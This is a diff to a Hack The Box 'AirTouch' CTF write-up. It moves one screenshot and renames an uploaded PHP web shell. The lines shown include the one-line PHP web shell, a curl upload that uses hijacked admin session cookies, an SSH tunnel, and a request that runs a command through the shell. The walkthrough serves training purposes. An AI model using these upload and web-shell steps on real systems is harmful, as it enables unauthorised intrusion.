@@ -235,8 +235,6 @@ We filtered the traffic for `http` and looked for packets containing login data 
 * **UserRole:** `admin`
 
 
-![AirTouch](htb_Airtouch_got_manger.png)
-
 ## Web Exploitation & RCE
 
 With the admin cookies, we could hijack a session on the web portal running at `192.168.3.1`.
@@ -269,6 +267,8 @@ ssh -f -N -L 4444:192.168.3.1:80 consultant@10.XX.XX.XXX
 
 ![AirTouch](htb_Airtouch__adminphp.png)
 
+![AirTouch](htb_Airtouch_got_manger.png)
+
 ![AirTouch](htb_Airtouch_got_manger_lab.png)
 
 
@@ -278,7 +278,7 @@ The dashboard contained a file upload feature. We exploited this to upload a PHP
 
 1. **Create the Payload:**
 ```bash
-cat > exploit.phtml << 'EOF'
+cat > shell.phtml << 'EOF'
 <?php system($_GET['cmd']); ?>
 EOF
 ```
@@ -301,7 +301,7 @@ EOF
 We used `curl` to upload the file, ensuring we passed the admin cookies.
 ```bash
 curl -b "PHPSESSID=sr******************s;UserRole=admin" \
--F "fileToUpload=@exploit.phtml" -F "submit=Upload File" \
+-F "fileToUpload=@shell.phtml" -F "submit=Upload File" \
 http://localhost:4444/upload.php
 
 ```
@@ -313,7 +313,7 @@ http://localhost:4444/upload.php
 We accessed the uploaded file to execute commands.
 ```bash
 curl -b "PHPSESSID=sr******************s;UserRole=admin" \
-"http://localhost:4444/uploads/exploit.phtml?c=uname+-a"
+"http://localhost:4444/uploads/shell.phtml?c=uname+-a"
 
 ```
 
